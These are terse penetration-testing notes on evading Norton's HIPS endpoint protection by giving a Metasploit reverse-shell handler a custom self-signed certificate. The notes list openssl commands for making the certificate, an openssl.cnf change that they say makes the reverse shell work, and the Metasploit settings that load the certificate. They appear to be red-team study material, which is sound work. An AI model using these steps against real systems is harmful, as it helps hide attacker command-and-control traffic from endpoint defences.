Case study : bypass NORTON HIPS with custom certificates

  • HIPS installed in an endpoint
    • has full acess of machine traffic and can block traffic
  • NORTON HIPS = signature based (e.g detect https certificates )
  • idea : craft custom certificate

openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
cat priv.key cert.crt > nasa.pem
## change the CipherString536 in the /etc/ssl/openssl.cnf so our revshell works
CipherString=DEFAULT

# configure metasploit 
set HandlerSSLCert /home/kali/self_cert/nasa.pem
exploit
